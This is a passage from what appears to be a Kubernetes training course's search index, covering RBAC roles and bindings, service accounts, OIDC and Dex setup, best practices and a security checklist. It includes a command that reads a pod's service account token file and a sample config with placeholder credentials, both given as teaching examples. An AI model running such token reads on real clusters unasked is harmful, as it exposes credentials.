RoleBinding\nmetadata:\n  name: engineering-binding\n  namespace: development\nsubjects:\n- kind: Group\n  name: engineering\n  apiGroup: rbac.authorization.k8s.io\nroleRef:\n  kind: Role\n  name: developer-role\n  apiGroup: rbac.authorization.k8s.io\n</code></pre> <p>Bind Role to Service Account:</p> <pre><code>apiVersion: rbac.authorization.k8s.io/v1\nkind: RoleBinding\nmetadata:\n  name: app-binding\n  namespace: production\nsubjects:\n- kind: ServiceAccount\n  name: app-sa\n  namespace: production\nroleRef:\n  kind: Role\n  name: app-role\n  apiGroup: rbac.authorization.k8s.io\n</code></pre>"},{"location":"05-authn-authz/#35-clusterrolebindings","title":"3.5 ClusterRoleBindings","text":"<pre><code>apiVersion: rbac.authorization.k8s.io/v1\nkind: ClusterRoleBinding\nmetadata:\n  name: cluster-admin-binding\nsubjects:\n- kind: User\n  name: admin\n  apiGroup: rbac.authorization.k8s.io\n- kind: Group\n  name: cluster-admins\n  apiGroup: rbac.authorization.k8s.io\nroleRef:\n  kind: ClusterRole\n  name: cluster-admin\n  apiGroup: rbac.authorization.k8s.io\n</code></pre>"},{"location":"05-authn-authz/#36-built-in-clusterroles","title":"3.6 Built-in ClusterRoles","text":"<p>Kubernetes provides several built-in ClusterRoles:</p> <p>cluster-admin: - Superuser access - Full permissions across cluster - Use sparingly!</p> <p>admin: - Full access within a namespace - Can create Roles and RoleBindings - Cannot modify ResourceQuotas or namespace itself</p> <p>edit: - Read/write access to most resources in namespace - Cannot view or modify Roles or RoleBindings - Good for developers</p> <p>view: - Read-only access to most resources - Cannot view Secrets or Roles/RoleBindings - Good for monitoring</p> <p>Example Usage:</p> <pre><code># Give user edit permissions in namespace\napiVersion: rbac.authorization.k8s.io/v1\nkind: RoleBinding\nmetadata:\n  name: developer-edit\n  namespace: development\nsubjects:\n- kind: User\n  name: developer\n  apiGroup: rbac.authorization.k8s.io\nroleRef:\n  kind: ClusterRole\n  name: edit\n  apiGroup: rbac.authorization.k8s.io\n</code></pre>"},{"location":"05-authn-authz/#37-aggregated-clusterroles","title":"3.7 Aggregated ClusterRoles","text":"<pre><code># Define aggregation rule\napiVersion: rbac.authorization.k8s.io/v1\nkind: ClusterRole\nmetadata:\n  name: monitoring\naggregationRule:\n  clusterRoleSelectors:\n  - matchLabels:\n      rbac.example.com/aggregate-to-monitoring: \"true\"\nrules: []  # Rules automatically filled\n---\n# ClusterRole that aggregates\napiVersion: rbac.authorization.k8s.io/v1\nkind: ClusterRole\nmetadata:\n  name: monitoring-pods\n  labels:\n    rbac.example.com/aggregate-to-monitoring: \"true\"\nrules:\n- apiGroups: [\"\"]\n  resources: [\"pods\", \"pods/log\"]\n  verbs: [\"get\", \"list\", \"watch\"]\n</code></pre>"},{"location":"05-authn-authz/#38-resource-specific-permissions","title":"3.8 Resource-Specific Permissions","text":"<p>Limit access to specific resource instances:</p> <pre><code>apiVersion: rbac.authorization.k8s.io/v1\nkind: Role\nmetadata:\n  name: configmap-reader\n  namespace: production\nrules:\n- apiGroups: [\"\"]\n  resources: [\"configmaps\"]\n  resourceNames: [\"app-config\", \"database-config\"]  # Only these\n  verbs: [\"get\", \"list\"]\n</code></pre> <p>Subresources:</p> <pre><code>apiVersion: rbac.authorization.k8s.io/v1\nkind: Role\nmetadata:\n  name: pod-debugger\n  namespace: production\nrules:\n- apiGroups: [\"\"]\n  resources: [\"pods\"]\n  verbs: [\"get\", \"list\"]\n- apiGroups: [\"\"]\n  resources: [\"pods/exec\", \"pods/log\", \"pods/portforward\"]\n  verbs: [\"create\", \"get\"]\n</code></pre>"},{"location":"05-authn-authz/#4-service-accounts","title":"4. Service Accounts","text":""},{"location":"05-authn-authz/#41-what-are-service-accounts","title":"4.1 What are Service Accounts?","text":"<p>Service Accounts provide an identity for processes running in Pods. They are used for Pod-to-API server authentication.</p> <p>Automatic Creation: - Every namespace has a <code>default</code> service account - Automatically mounted in Pods at <code>/var/run/secrets/kubernetes.io/serviceaccount/</code></p>"},{"location":"05-authn-authz/#42-creating-service-accounts","title":"4.2 Creating Service Accounts","text":"<pre><code>apiVersion: v1\nkind: ServiceAccount\nmetadata:\n  name: app-sa\n  namespace: production\n  labels:\n    app: myapp\nautomountServiceAccountToken: true\n</code></pre> <p>Create with kubectl:</p> <pre><code>kubectl create serviceaccount app-sa -n production\n</code></pre>"},{"location":"05-authn-authz/#43-using-service-accounts-in-pods","title":"4.3 Using Service Accounts in Pods","text":"<pre><code>apiVersion: v1\nkind: Pod\nmetadata:\n  name: app-pod\n  namespace: production\nspec:\n  serviceAccountName: app-sa\n  automountServiceAccountToken: true\n  containers:\n  - name: app\n    image: myapp:1.0\n</code></pre> <p>Disable auto-mounting:</p> <pre><code>apiVersion: v1\nkind: Pod\nmetadata:\n  name: app-pod\nspec:\n  serviceAccountName: app-sa\n  automountServiceAccountToken: false  # Don't mount SA token\n  containers:\n  - name: app\n    image: myapp:1.0\n</code></pre>"},{"location":"05-authn-authz/#44-service-account-tokens","title":"4.4 Service Account Tokens","text":"<p>Token Location in Pod: <pre><code># Inside Pod\ncat /var/run/secrets/kubernetes.io/serviceaccount/token\ncat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt\ncat /var/run/secrets/kubernetes.io/serviceaccount/namespace\n</code></pre></p> <p>Create Token Manually (1.24+):</p> <pre><code>kubectl create token app-sa -n production --duration=8h\n</code></pre> <p>Legacy Token Secret (pre-1.24):</p> <pre><code>apiVersion: v1\nkind: Secret\nmetadata:\n  name: app-sa-token\n  namespace: production\n  annotations:\n    kubernetes.io/service-account.name: app-sa\ntype: kubernetes.io/service-account-token\n</code></pre>"},{"location":"05-authn-authz/#45-service-account-with-rbac","title":"4.5 Service Account with RBAC","text":"<p>Complete Example:</p> <pre><code># Service Account\napiVersion: v1\nkind: ServiceAccount\nmetadata:\n  name: pod-reader-sa\n  namespace: production\n---\n# Role\napiVersion: rbac.authorization.k8s.io/v1\nkind: Role\nmetadata:\n  name: pod-reader-role\n  namespace: production\nrules:\n- apiGroups: [\"\"]\n  resources: [\"pods\"]\n  verbs: [\"get\", \"list\", \"watch\"]\n---\n# RoleBinding\napiVersion: rbac.authorization.k8s.io/v1\nkind: RoleBinding\nmetadata:\n  name: pod-reader-binding\n  namespace: production\nsubjects:\n- kind: ServiceAccount\n  name: pod-reader-sa\n  namespace: production\nroleRef:\n  kind: Role\n  name: pod-reader-role\n  apiGroup: rbac.authorization.k8s.io\n---\n# Pod using Service Account\napiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-reader-pod\n  namespace: production\nspec:\n  serviceAccountName: pod-reader-sa\n  containers:\n  - name: kubectl\n    image: bitnami/kubectl:latest\n    command: ['sh', '-c', 'while true; do kubectl get pods; sleep 30; done']\n</code></pre>"},{"location":"05-authn-authz/#5-oidc-integration","title":"5. OIDC Integration","text":""},{"location":"05-authn-authz/#51-what-is-oidc","title":"5.1 What is OIDC?","text":"<p>OpenID Connect (OIDC) is an identity layer on top of OAuth 2.0. It allows Kubernetes to integrate with external identity providers like:</p> <ul> <li>Azure Active Directory</li> <li>Google Identity</li> <li>Okta</li> <li>Keycloak</li> <li>Auth0</li> <li>Dex</li> </ul>"},{"location":"05-authn-authz/#52-api-server-oidc-configuration","title":"5.2 API Server OIDC Configuration","text":"<p>API Server Flags:</p> <pre><code># kube-apiserver configuration\nspec:\n  containers:\n  - name: kube-apiserver\n    command:\n    - kube-apiserver\n    - --oidc-issuer-url=https://accounts.google.com\n    - --oidc-client-id=kubernetes\n    - --oidc-username-claim=email\n    - --oidc-groups-claim=groups\n    - --oidc-ca-file=/etc/kubernetes/pki/oidc-ca.crt\n    - --oidc-username-prefix=oidc:\n    - --oidc-groups-prefix=oidc:\n</code></pre> <p>Flag Descriptions: - <code>--oidc-issuer-url</code>: OIDC provider URL - <code>--oidc-client-id</code>: Client ID for the cluster - <code>--oidc-username-claim</code>: JWT claim for username - <code>--oidc-groups-claim</code>: JWT claim for groups - <code>--oidc-ca-file</code>: CA certificate for OIDC provider - <code>--oidc-username-prefix</code>: Prefix for usernames - <code>--oidc-groups-prefix</code>: Prefix for groups</p>"},{"location":"05-authn-authz/#53-kubeconfig-with-oidc","title":"5.3 kubeconfig with OIDC","text":"<p>Using oidc-login kubectl plugin:</p> <pre><code># Install oidc-login\nkubectl krew install oidc-login\n</code></pre> <pre><code>apiVersion: v1\nkind: Config\nusers:\n- name: oidc-user\n  user:\n    exec:\n      apiVersion: client.authentication.k8s.io/v1beta1\n      command: kubectl\n      args:\n      - oidc-login\n      - get-token\n      - --oidc-issuer-url=https://accounts.google.com\n      - --oidc-client-id=kubernetes\n      - --oidc-client-secret=secret\n</code></pre>"},{"location":"05-authn-authz/#54-oidc-with-rbac","title":"5.4 OIDC with RBAC","text":"<pre><code># ClusterRoleBinding for OIDC group\napiVersion: rbac.authorization.k8s.io/v1\nkind: ClusterRoleBinding\nmetadata:\n  name: engineering-admin\nsubjects:\n- kind: Group\n  name: oidc:engineering@example.com\n  apiGroup: rbac.authorization.k8s.io\nroleRef:\n  kind: ClusterRole\n  name: admin\n  apiGroup: rbac.authorization.k8s.io\n</code></pre>"},{"location":"05-authn-authz/#55-dex-as-oidc-provider","title":"5.5 Dex as OIDC Provider","text":"<p>Dex Deployment:</p> <pre><code>apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: dex\n  namespace: auth\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: dex\n  template:\n    metadata:\n      labels:\n        app: dex\n    spec:\n      containers:\n      - name: dex\n        image: ghcr.io/dexidp/dex:v2.37.0\n        ports:\n        - containerPort: 5556\n        volumeMounts:\n        - name: config\n          mountPath: /etc/dex\n      volumes:\n      - name: config\n        configMap:\n          name: dex-config\n</code></pre> <p>Dex ConfigMap:</p> <pre><code>apiVersion: v1\nkind: ConfigMap\nmetadata:\n  name: dex-config\n  namespace: auth\ndata:\n  config.yaml: |\n    issuer: https://dex.example.com\n    storage:\n      type: kubernetes\n      config:\n        inCluster: true\n    web:\n      http: 0.0.0.0:5556\n    connectors:\n    - type: ldap\n      id: ldap\n      name: LDAP\n      config:\n        host: ldap.example.com:636\n        bindDN: cn=admin,dc=example,dc=com\n        bindPW: password\n        userSearch:\n          baseDN: ou=users,dc=example,dc=com\n          filter: \"(objectClass=person)\"\n          username: uid\n          idAttr: uid\n          emailAttr: mail\n        groupSearch:\n          baseDN: ou=groups,dc=example,dc=com\n          filter: \"(objectClass=groupOfNames)\"\n          userAttr: DN\n          groupAttr: member\n          nameAttr: cn\n    staticClients:\n    - id: kubernetes\n      redirectURIs:\n      - http://localhost:8000\n      - http://localhost:18000\n      name: 'Kubernetes'\n      secret: kubernetes-secret\n</code></pre>"},{"location":"05-authn-authz/#6-authentication-and-authorization-flow-diagram","title":"6. Authentication and Authorization Flow Diagram","text":"<pre><code>sequenceDiagram\n    participant User\n    participant kubectl\n    participant APIServer as API Server\n    participant Authn as Authentication\n    participant Authz as Authorization\n    participant AdmCtrl as Admission Control\n    participant etcd\n\n    User-&gt;&gt;kubectl: kubectl get pods\n    kubectl-&gt;&gt;kubectl: Load kubeconfig&lt;br/&gt;Get credentials\n    kubectl-&gt;&gt;APIServer: HTTPS Request&lt;br/&gt;TLS + Bearer Token/Cert\n\n    APIServer-&gt;&gt;Authn: Authenticate Request\n\n    alt X.509 Certificate\n        Authn-&gt;&gt;Authn: Verify cert signature&lt;br/&gt;Extract CN (user)&lt;br/&gt;Extract O (groups)\n    else OIDC Token\n        Authn-&gt;&gt;Authn: Validate JWT&lt;br/&gt;Extract claims&lt;br/&gt;Get user &amp; groups\n    else Service Account\n        Authn-&gt;&gt;Authn: Verify SA token&lt;br/&gt;Get SA identity\n    end\n\n    Authn--&gt;&gt;APIServer: Identity: user=alice&lt;br/&gt;groups=[developers]\n\n    APIServer-&gt;&gt;Authz: Authorize Request&lt;br/&gt;user, resource, verb\n\n    Authz-&gt;&gt;Authz: Check RBAC rules&lt;br/&gt;Role, RoleBinding&lt;br/&gt;ClusterRole, ClusterRoleBinding\n\n    alt Authorized\n        Authz--&gt;&gt;APIServer: Allow\n    else Not Authorized\n        Authz--&gt;&gt;APIServer: Deny (403 Forbidden)\n        APIServer--&gt;&gt;kubectl: Error: Forbidden\n        kubectl--&gt;&gt;User: Error message\n    end\n\n    APIServer-&gt;&gt;AdmCtrl: Mutating Webhooks\n    AdmCtrl-&gt;&gt;AdmCtrl: Modify request if needed\n    AdmCtrl--&gt;&gt;APIServer: Modified request\n\n    APIServer-&gt;&gt;AdmCtrl: Validating Webhooks\n    AdmCtrl-&gt;&gt;AdmCtrl: Validate request\n\n    alt Valid\n        AdmCtrl--&gt;&gt;APIServer: Allow\n    else Invalid\n        AdmCtrl--&gt;&gt;APIServer: Deny (400 Bad Request)\n        APIServer--&gt;&gt;kubectl: Error: Invalid\n        kubectl--&gt;&gt;User: Error message\n    end\n\n    APIServer-&gt;&gt;etcd: Store/Retrieve resource\n    etcd--&gt;&gt;APIServer: Resource data\n\n    APIServer--&gt;&gt;kubectl: Success Response&lt;br/&gt;Resource data\n    kubectl--&gt;&gt;User: Display result\n\n    style Authn fill:#FF6B6B,stroke:#fff,color:#fff\n    style Authz fill:#4ECDC4,stroke:#fff,color:#fff\n    style AdmCtrl fill:#95E1D3,stroke:#fff,color:#000\n    style APIServer fill:#326CE5,stroke:#fff,color:#fff</code></pre>"},{"location":"05-authn-authz/#7-best-practices","title":"7. Best Practices","text":""},{"location":"05-authn-authz/#71-authentication-best-practices","title":"7.1 Authentication Best Practices","text":"<ol> <li>Use OIDC for user authentication</li> <li>Centralized identity management</li> <li>MFA support</li> <li>Audit trail</li> <li> <p>Token expiration</p> </li> <li> <p>Avoid static credentials</p> </li> <li>No static token files</li> <li>No long-lived tokens</li> <li> <p>Rotate certificates regularly</p> </li> <li> <p>Use short-lived tokens</p> </li> <li>Service account token TTL</li> <li>Regular rotation</li> <li> <p>Automatic expiration</p> </li> <li> <p>Enable audit logging</p> </li> <li>Track authentication attempts</li> <li>Monitor failed logins</li> <li>Compliance requirements</li> </ol>"},{"location":"05-authn-authz/#72-rbac-best-practices","title":"7.2 RBAC Best Practices","text":"<ol> <li>Principle of least privilege</li> <li>Grant minimum permissions needed</li> <li>Start restrictive, add as needed</li> <li> <p>Regular permission reviews</p> </li> <li> <p>Use Roles over ClusterRoles when possible</p> </li> <li>Namespace isolation</li> <li>Limit blast radius</li> <li> <p>Easier to manage</p> </li> <li> <p>Avoid wildcards <pre><code># DON'T\nrules:\n- apiGroups: [\"*\"]\n  resources: [\"*\"]\n  verbs: [\"*\"]\n\n# DO\nrules:\n- apiGroups: [\"\"]\n  resources: [\"pods\", \"services\"]\n  verbs: [\"get\", \"list\", \"watch\"]\n</code></pre></p> </li> <li> <p>Use groups instead of individual users</p> </li> <li>Easier management</li> <li>Consistent permissions</li> <li> <p>Better for OIDC integration</p> </li> <li> <p>Separate service accounts per application</p> </li> <li>Isolation between apps</li> <li>Granular permissions</li> <li> <p>Better audit trail</p> </li> <li> <p>Regular RBAC audits</p> </li> <li>Review permissions quarterly</li> <li>Remove unused bindings</li> <li>Check for privilege escalation</li> </ol>"},{"location":"05-authn-authz/#73-service-account-best-practices","title":"7.3 Service Account Best Practices","text":"<ol> <li> <p>Don't use default service account <pre><code># Create dedicated SA\napiVersion: v1\nkind: ServiceAccount\nmetadata:\n  name: myapp-sa\n---\nspec:\n  serviceAccountName: myapp-sa\n</code></pre></p> </li> <li> <p>Disable auto-mounting when not needed <pre><code>spec:\n  automountServiceAccountToken: false\n</code></pre></p> </li> <li> <p>Use bound service account tokens (1.24+)</p> </li> <li>Time-limited</li> <li>Audience-bound</li> <li> <p>More secure</p> </li> <li> <p>Minimize service account permissions</p> </li> <li>Only what app needs</li> <li>No cluster-admin</li> <li>Namespace-scoped when possible</li> </ol>"},{"location":"05-authn-authz/#8-anti-patterns-and-common-mistakes","title":"8. Anti-Patterns and Common Mistakes","text":""},{"location":"05-authn-authz/#81-authentication-anti-patterns","title":"8.1 Authentication Anti-Patterns","text":"<p>\u274c Using admin credentials for everything - Security risk - No accountability - Violates least privilege</p> <p>\u274c Sharing kubeconfig files - No individual accountability - Cannot revoke individual access - Compliance violations</p> <p>\u274c Long-lived static tokens <pre><code># INSECURE\n--token-auth-file=/etc/kubernetes/tokens.csv\n</code></pre></p>"},{"location":"05-authn-authz/#82-rbac-anti-patterns","title":"8.2 RBAC Anti-Patterns","text":"<p>\u274c Overly permissive roles <pre><code># TOO PERMISSIVE\nrules:\n- apiGroups: [\"*\"]\n  resources: [\"*\"]\n  verbs: [\"*\"]\n</code></pre></p> <p>\u274c Granting cluster-admin unnecessarily <pre><code># DANGEROUS - Only for actual admins\nroleRef:\n  kind: ClusterRole\n  name: cluster-admin\n</code></pre></p> <p>\u274c Ignoring namespace boundaries <pre><code># Creates security risk\nkind: ClusterRoleBinding  # Should be RoleBinding\n</code></pre></p> <p>\u274c Not using resource names <pre><code># Allows access to ALL secrets\nresources: [\"secrets\"]\nverbs: [\"get\"]\n\n# Better - specific secrets\nresources: [\"secrets\"]\nresourceNames: [\"app-secret\"]\nverbs: [\"get\"]\n</code></pre></p>"},{"location":"05-authn-authz/#83-service-account-anti-patterns","title":"8.3 Service Account Anti-Patterns","text":"<p>\u274c Using default service account <pre><code># DON'T rely on default\nspec:\n  # serviceAccountName: default (implicit)\n</code></pre></p> <p>\u274c Granting unnecessary permissions to Pods <pre><code># Pod doesn't need API access but SA has permissions\nspec:\n  serviceAccountName: powerful-sa  # Unnecessary\n  automountServiceAccountToken: true\n</code></pre></p> <p>\u274c Not rotating service account tokens - Long-lived tokens - Security risk if compromised - Use short-lived tokens</p>"},{"location":"05-authn-authz/#9-rbac-examples-and-common-patterns","title":"9. RBAC Examples and Common Patterns","text":""},{"location":"05-authn-authz/#91-developer-role","title":"9.1 Developer Role","text":"<pre><code>apiVersion: rbac.authorization.k8s.io/v1\nkind: Role\nmetadata:\n  name: developer\n  namespace: development\nrules:\n# Full access to deployments, services\n- apiGroups: [\"apps\"]\n  resources: [\"deployments\", \"replicasets\"]\n  verbs: [\"*\"]\n- apiGroups: [\"\"]\n  resources: [\"services\", \"configmaps\"]\n  verbs: [\"*\"]\n# Read-only for pods\n- apiGroups: [\"\"]\n  resources: [\"pods\", \"pods/log\"]\n  verbs: [\"get\", \"list\", \"watch\"]\n# Exec into pods for debugging\n- apiGroups: [\"\"]\n  resources: [\"pods/exec\"]\n  verbs: [\"create\"]\n# No access to secrets\n</code></pre>"},{"location":"05-authn-authz/#92-cicd-role","title":"9.2 CI/CD Role","text":"<pre><code>apiVersion: rbac.authorization.k8s.io/v1\nkind: Role\nmetadata:\n  name: cicd-deployer\n  namespace: production\nrules:\n# Deploy applications\n- apiGroups: [\"apps\"]\n  resources: [\"deployments\"]\n  verbs: [\"get\", \"list\", \"create\", \"update\", \"patch\"]\n# Manage services\n- apiGroups: [\"\"]\n  resources: [\"services\"]\n  verbs: [\"get\", \"list\", \"create\", \"update\", \"patch\"]\n# Read-only for pods (verification)\n- apiGroups: [\"\"]\n  resources: [\"pods\"]\n  verbs: [\"get\", \"list\", \"watch\"]\n# Manage ConfigMaps\n- apiGroups: [\"\"]\n  resources: [\"configmaps\"]\n  verbs: [\"get\", \"list\", \"create\", \"update\", \"patch\"]\n# No delete permissions\n</code></pre>"},{"location":"05-authn-authz/#93-read-only-cluster-viewer","title":"9.3 Read-Only Cluster Viewer","text":"<pre><code>apiVersion: rbac.authorization.k8s.io/v1\nkind: ClusterRole\nmetadata:\n  name: cluster-viewer\nrules:\n- apiGroups: [\"\"]\n  resources: [\"nodes\", \"namespaces\", \"persistentvolumes\"]\n  verbs: [\"get\", \"list\", \"watch\"]\n- apiGroups: [\"\"]\n  resources: [\"pods\", \"services\", \"configmaps\"]\n  verbs: [\"get\", \"list\", \"watch\"]\n- apiGroups: [\"apps\"]\n  resources: [\"deployments\", \"statefulsets\", \"daemonsets\"]\n  verbs: [\"get\", \"list\", \"watch\"]\n# No secrets access\n# No write permissions\n</code></pre>"},{"location":"05-authn-authz/#94-monitoring-role","title":"9.4 Monitoring Role","text":"<pre><code>apiVersion: rbac.authorization.k8s.io/v1\nkind: ClusterRole\nmetadata:\n  name: monitoring\nrules:\n# Metrics\n- apiGroups: [\"\"]\n  resources: [\"nodes/metrics\", \"pods/metrics\"]\n  verbs: [\"get\", \"list\"]\n# Node and pod info\n- apiGroups: [\"\"]\n  resources: [\"nodes\", \"pods\"]\n  verbs: [\"get\", \"list\", \"watch\"]\n# Resource metrics\n- apiGroups: [\"metrics.k8s.io\"]\n  resources: [\"nodes\", \"pods\"]\n  verbs: [\"get\", \"list\"]\n</code></pre>"},{"location":"05-authn-authz/#95-namespace-admin","title":"9.5 Namespace Admin","text":"<pre><code>apiVersion: rbac.authorization.k8s.io/v1\nkind: RoleBinding\nmetadata:\n  name: team-admin\n  namespace: team-namespace\nsubjects:\n- kind: Group\n  name: team-leads\n  apiGroup: rbac.authorization.k8s.io\nroleRef:\n  kind: ClusterRole\n  name: admin  # Built-in admin role\n  apiGroup: rbac.authorization.k8s.io\n</code></pre>"},{"location":"05-authn-authz/#10-troubleshooting","title":"10. Troubleshooting","text":""},{"location":"05-authn-authz/#101-check-user-permissions","title":"10.1 Check User Permissions","text":"<pre><code># Can I create pods?\nkubectl auth can-i create pods\n\n# Can I delete deployments in namespace?\nkubectl auth can-i delete deployments -n production\n\n# Can specific user do action?\nkubectl auth can-i list secrets --as=developer -n production\n\n# Check all permissions for user\nkubectl auth can-i --list --as=developer -n production\n</code></pre>"},{"location":"05-authn-authz/#102-verify-rbac-configuration","title":"10.2 Verify RBAC Configuration","text":"<pre><code># List all roles in namespace\nkubectl get roles -n production\n\n# Describe role\nkubectl describe role developer -n production\n\n# List role bindings\nkubectl get rolebindings -n production\n\n# Describe role binding\nkubectl describe rolebinding developer-binding -n production\n\n# List cluster roles\nkubectl get clusterroles\n\n# List cluster role bindings\nkubectl get clusterrolebindings\n</code></pre>"},{"location":"05-authn-authz/#103-debug-authentication-issues","title":"10.3 Debug Authentication Issues","text":"<pre><code># View kubeconfig\nkubectl config view\n\n# Check current user\nkubectl config current-context\n\n# Verify API server connectivity\nkubectl cluster-info\n\n# Check certificate expiration\nkubeadm certs check-expiration\n\n# View audit logs (on control plane)\ncat /var/log/kubernetes/audit.log | jq '.user.username'\n</code></pre>"},{"location":"05-authn-authz/#11-hands-on-lab-references","title":"11. Hands-on Lab References","text":"<p>This module includes the following hands-on labs in the <code>/labs/05-authn-authz/</code> directory:</p> <ol> <li>Lab 5.1: User Authentication with Certificates</li> <li>Generate user certificates</li> <li>Create kubeconfig</li> <li>Test authentication</li> <li> <p>File: <code>/labs/05-authn-authz/lab-5.1-user-authn.md</code></p> </li> <li> <p>Lab 5.2: RBAC Basics</p> </li> <li>Create Roles and RoleBindings</li> <li>Test permissions</li> <li>Use built-in roles</li> <li> <p>File: <code>/labs/05-authn-authz/lab-5.2-rbac-basics.md</code></p> </li> <li> <p>Lab 5.3: Service Accounts</p> </li> <li>Create service accounts</li> <li>Bind roles to service accounts</li> <li>Use in Pods</li> <li> <p>File: <code>/labs/05-authn-authz/lab-5.3-service-accounts.md</code></p> </li> <li> <p>Lab 5.4: OIDC Integration</p> </li> <li>Configure OIDC provider</li> <li>Set up API server</li> <li>Test OIDC authentication</li> <li> <p>File: <code>/labs/05-authn-authz/lab-5.4-oidc.md</code></p> </li> <li> <p>Lab 5.5: RBAC Troubleshooting</p> </li> <li>Debug permission issues</li> <li>Audit RBAC configuration</li> <li>Fix common problems</li> <li>File: <code>/labs/05-authn-authz/lab-5.5-troubleshooting.md</code></li> </ol>"},{"location":"05-authn-authz/#12-security-checklist","title":"12. Security Checklist","text":""},{"location":"05-authn-authz/#authentication","title":"Authentication","text":"<ul> <li>[ ] Use OIDC for user authentication in production</li> <li>[ ] Disable anonymous authentication (--anonymous-auth=false)</li> <li>[ ] Enable audit logging for authentication events</li> <li>[ ] Rotate certificates before expiration</li> <li>[ ] Use short-lived tokens (not static tokens)</li> <li>[ ] Implement MFA via OIDC provider</li> <li>[ ] Disable insecure authentication methods</li> <li>[ ] Use TLS for all API server connections</li> </ul>"},{"location":"05-authn-authz/#authorization-rbac","title":"Authorization (RBAC)","text":"<ul> <li>[ ] Enable RBAC (--authorization-mode=Node,RBAC)</li> <li>[ ] Follow principle of least privilege</li> <li>[ ] Use Roles over ClusterRoles when possible</li> <li>[ ] Avoid wildcard permissions (*) in production</li> <li>[ ] Regular RBAC audit (quarterly minimum)</li> <li>[ ] Document all custom roles</li> <li>[ ] Use groups instead of individual users</li> <li>[ ] Implement namespace isolation with RBAC</li> <li>[ ] Restrict access to cluster-admin role</li> <li>[ ] Monitor for privilege escalation attempts</li> </ul>"},{"location":"05-authn-authz/#service-accounts","title":"Service Accounts","text":"<ul> <li>[ ] Create dedicated service accounts per application</li> <li>[ ] Don't use default service account</li> <li>[ ] Disable automountServiceAccountToken when not needed</li> <li>[ ] Use bound service account tokens (1.24+)</li> <li>[ ] Minimize service account permissions</li> <li>[ ] Regular service account audit</li> <li>[ ] Implement service account token rotation</li> <li>[ ] Use namespace-scoped permissions</li> </ul>"},{"location":"05-authn-authz/#secrets-management","title":"Secrets Management","text":"<ul> <li>[ ] Restrict access to secrets via RBAC</li> <li>[ ] Use external secret management (Vault, etc.)</li> <li>[ ] Enable encryption at rest for secrets</li> <li>[ ] Audit secret access</li> <li>[ ] Rotate secrets regularly</li> <li>[ ] Don't log secrets</li> <li>[ ] Use immutable secrets when appropriate</li> </ul>"},{"location":"05-authn-authz/#compliance-and-audit","title":"Compliance and Audit","text":"<ul> <li>[ ] Enable comprehensive audit logging</li> <li>[ ] Retain audit logs per compliance requirements</li> <li>[ ] Monitor authentication failures</li> <li>[ ] Track privilege escalation attempts</li> <li>[ ] Regular access reviews</li> <li>[ ] Document all custom RBAC policies</li> <li>[ ] Implement alerting for suspicious activities</li> </ul>"},{"location":"05-authn-authz/#13-references","title":"13. References","text":"<ol> <li>Kubernetes Official Documentation</li> <li>Authentication: https://kubernetes.io/docs/reference/access-authn-authz/authentication/</li> <li>Authorization: https://kubernetes.io/docs/reference/access-authn-authz/authorization/</li> <li>RBAC: https://kubernetes.io/docs/reference/access-authn-authz/rbac/</li> <li>Service Accounts: https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/</li> <li> <p>Admission Controllers: https://kubernetes.io/docs/reference/access-authn-authz/admission-controllers/</p> </li> <li> <p>Security Best Practices</p> </li> <li>CIS Kubernetes Benchmark: https://www.cisecurity.org/benchmark/kubernetes</li> <li>NSA/CISA Kubernetes Hardening Guide: https://media.defense.gov/2022/Aug/29/2003066362/-1/-1/0/CTR_KUBERNETES_HARDENING_GUIDANCE_1.2_20220829.PDF</li> <li> <p>OWASP Kubernetes Security Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Kubernetes_Security_Cheat_Sheet.html</p> </li> <li> <p>OIDC and Identity</p> </li> <li>OpenID Connect Core: https://openid.net/specs/openid-connect-core-1_0.html</li> <li>Dex Documentation: https://dexidp.io/docs/</li> <li> <p>Keycloak Documentation: https://www.keycloak.org/documentation</p> </li> <li> <p>Tools</p> </li> <li>kubectl-who-can: https://github.com/aquasecurity/kubectl-who-can</li> <li>rbac-lookup: https://github.com/FairwindsOps/rbac-lookup</li> <li>rakkess: https://github.com/corneliusweig/rakkess</li> <li> <p>audit2rbac: https://github.com/liggitt/audit2rbac</p> </li> <li> <p>CNCF Resources</p> </li> <li>CNCF Security TAG: https://github.com/cncf/tag-security</li> <li> <p>Kubernetes SIG Auth: https://github.com/kubernetes/community/tree/master/sig-auth</p> </li> <li> <p>Books and Guides</p> </li> <li>\"Kubernetes Security\" by Liz Rice and Michael Hausenblas (O'Reilly)</li> <li>\"Kubernetes Best Practices\" by Brendan Burns et al. (O'Reilly)</li> <li>\"Managing Kubernetes\" by Brendan Burns and Craig Tracey (O'Reilly)</li> </ol>"},{"location":"05-authn-authz/#summary","title":"Summary","text":"<p>In this module, you learned about Kubernetes authentication and authorization:</p> <p>Authentication: - Multiple authentication strategies (certificates, OIDC, service accounts) - kubeconfig files and context management - User certificate generation and management - OIDC integration for enterprise identity providers</p> <p>Authorization (RBAC): - Roles and ClusterRoles define permissions - RoleBindings and ClusterRoleBindings assign permissions - Built-in roles (cluster-admin, admin, edit, view) - Principle of least privilege</p> <p>Service Accounts: - Identity for Pods and processes - Bound to namespaces - Used with RBAC for Pod authorization - Token management and rotation</p> <p>Best Practices: - Use OIDC for user authentication - Implement least privilege with RBAC - Create dedicated service accounts per application - Regular audits and access reviews - Comprehensive audit logging</p> <p>Security: - Disable anonymous authentication - Avoid wildcard permissions - Regular certificate rotation - Monitor for privilege escalation - Implement namespace isolation</p> <p>Understanding authentication and authorization is critical for securing Kubernetes clusters. These mechanisms form the foundation of cluster security and must be properly configured and maintained.</p> <p>Training Modules Complete!</p> <p>This concludes the Kubernetes training modules. You now have comprehensive knowledge of: - Module 01: Kubernetes Basics - Module 02: Control Plane and Cluster Components - Module 03: Networking - Module 04: Storage - Module 05: Authentication and Authorization</p> <p>Continue to the hands-on labs to reinforce your learning and gain practical experience!</p>"},{"location":"06-pod-security/","title":"Module 06: Pod Security","text":""},{"location":"06-pod-security/#overview","title":"Overview","text":"<p>Estimated Time: 6-7 hours</p> <p>Module Type: Security Deep Dive</p> <p>Prerequisites: - Module 01 - Kubernetes Basics - Module 02 - Control Plane and Cluster Components - Module 05 - Authentication and Authorization - Understanding of Linux security primitives (capabilities, namespaces, cgroups)</p> <p>Pod security is foundational to Kubernetes cluster hardening. This module covers the Pod Security Standards framework, Pod Security Admission (PSA), security contexts, Linux security modules (seccomp, AppArmor, 